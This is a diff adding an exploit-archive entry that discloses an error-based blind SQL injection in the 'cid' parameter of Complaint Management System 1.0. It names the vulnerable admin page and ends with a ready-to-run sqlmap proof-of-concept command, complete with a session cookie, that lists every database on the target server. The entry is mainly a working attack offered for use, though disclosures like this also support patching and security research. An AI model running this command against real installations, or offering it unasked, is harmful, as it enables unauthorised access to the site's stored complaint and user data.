@@ -1,0 +1,11 @@
+# Title: Complaint Management System 1.0 - 'cid' SQL Injection
+# Exploit Author: Mohamed Elobeid (0b3!d)
+# Date: 2020-08-21
+# Vendor Homepage: https://www.sourcecodester.com/php/14206/complaint-management-system.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14206&title=Complaint+Management+System
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 3.2.4
+# Description
+This parameter "cid" is vulnerable to Error-Based blind SQL injection in this path "/Complaint%20Management%20System/admin/complaint-details.php?cid=60" that leads to retrieve all databases.
+
+#POC
+sqlmap -u 'http://target/Complaint Management System/admin/complaint-details.php?cid=60'  --cookie="PHPSESSID=bb4g25d3qceicepo7b3d26cfpp" --dbms=mysql --dbs
